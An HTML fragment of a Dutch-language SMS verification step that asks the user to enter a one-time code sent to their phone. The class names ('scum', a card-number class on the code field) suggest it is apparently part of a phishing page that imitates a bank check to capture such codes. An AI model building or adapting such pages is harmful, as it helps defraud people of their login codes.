...
<div class="login_flow scum" id="phone-view">
            ...
            <div class="form_fields form-group">
                <div class="form_labels"> 
                	<label for="mob"><span class="ng-binding">Ter verificatie van het door u opgegeven GSM-nummer hebben wij u eenmalig een sms code toegestuurd. Gelieve de toegestuurde code in het veld hieronder op te geven:</span></label>
                ...
                <div class="form_details ">
                    ...
                    <div class="default_input_field"> 
                    	...
                    	<input type="tel" name="otp" class="input_card_number form-control" data-err_text="gsm-nummer" placeholder="******" data-mask="99 99 99 99" mask-placeholder="-- -- -- --" autocomplete="one-time-code" required="">
                    </div>
                </div>
            </div>
